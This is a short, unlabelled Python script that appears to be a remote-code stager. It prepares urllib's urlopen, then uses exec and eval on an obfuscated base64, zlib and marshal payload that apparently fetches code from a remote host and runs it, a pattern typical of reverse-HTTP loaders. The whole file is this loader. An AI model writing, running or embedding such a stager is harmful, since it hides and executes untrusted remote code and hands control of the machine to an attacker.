import sys,zlib,base64,marshal,json,urllib
if sys.version_info[0] > 2:
    from urllib import request
urlopen = urllib.request.urlopen if sys.version_info[0] > 2 else urllib.urlopen
exec(eval(marshal.loads(zlib.decompress(base64.b64decode(b'eJwrtWFgYCgtyskvSM3TUM8oKSmw0tc3NDXTMzIw1bMw0TO0MLAyNDa20NcvLklMTy0q1i9OstArqFTX1CtKTUzR0AQATaQSPg==')))))